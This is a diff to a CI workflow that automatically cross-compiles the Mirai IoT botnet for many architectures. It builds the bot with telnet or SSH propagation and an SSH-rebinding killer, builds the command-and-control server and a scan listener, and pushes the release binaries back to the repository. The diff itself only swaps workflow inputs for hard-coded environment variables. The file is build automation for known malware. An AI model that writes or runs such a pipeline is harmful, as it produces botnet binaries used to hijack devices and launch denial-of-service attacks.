@@ -21,6 +21,9 @@ jobs:
           sudo apt-get install -y gcc-mips gcc-mipsel gcc-arm-linux-gnueabi gcc-arm-linux-gnueabihf gcc-powerpc gcc-sparc gcc-m68k gcc-sh4
 
       - name: Compile release
+        env:
+          BUILD_MODE: debug # debug/release
+          BUILD_TYPE: telnet # ssh/telnet
         run: |
           # Function to compile bot
           compile_bot() {
@@ -30,13 +33,13 @@ jobs:
           }
 
           FLAGS=""
-          if [ "${{ github.event.inputs.build_type }}" == "telnet" ]; then
+          if [ "$BUILD_TYPE" == "telnet" ]; then
             FLAGS="-DMIRAI_TELNET"
-          elif [ "${{ github.event.inputs.build_type }}" == "ssh" ]; then
+          elif [ "$BUILD_TYPE" == "ssh" ]; then
             FLAGS="-DMIRAI_SSH"
           fi
 
-          if [ "${{ github.event.inputs.build_mode }}" == "release" ]; then
+          if [ "$BUILD_MODE" == "release" ]; then
             rm -f release/mirai.* release/miraint.*
             compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
             compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
@@ -51,7 +54,7 @@ jobs:
 
             go build -o release/cnc cnc/*.go
             go build -o release/scanListen tools/scanListen.go
-          elif [ "${{ github.event.inputs.build_mode }}" == "debug" ]; then
+          elif [ "$BUILD_MODE" == "debug" ]; then
             gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -g -o debug/mirai.dbg
             gcc -std=c99 tools/enc.c -g -o debug/enc
             gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
@@ -59,7 +62,7 @@ jobs:
             go build -o debug/cnc cnc/*.go
             go build -o debug/scanListen tools/scanListen.go
           else
-            echo "Unknown parameter ${{ github.event.inputs.build_mode }}: debug or release required"
+            echo "Unknown parameter $BUILD_MODE: debug or release required"
             exit 1
           fi
 
@@ -68,17 +71,7 @@ jobs:
           git config --local user.email "you@example.com"
           git config --local user.name "Your Name"
           git add release/*
-          git commit -m "Build results for ${{ github.event.inputs.build_mode }} with ${{ github.event.inputs.build_type }}"
+          git commit -m "Build results for $BUILD_MODE with $BUILD_TYPE"
           git push
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
-    inputs:
-      build_mode:
-        description: 'Build mode (debug or release)'
-        required: true
-        default: 'release'
-      build_type:
-        description: 'Build type (telnet or ssh)'
-        required: true
-        default: 'telnet'
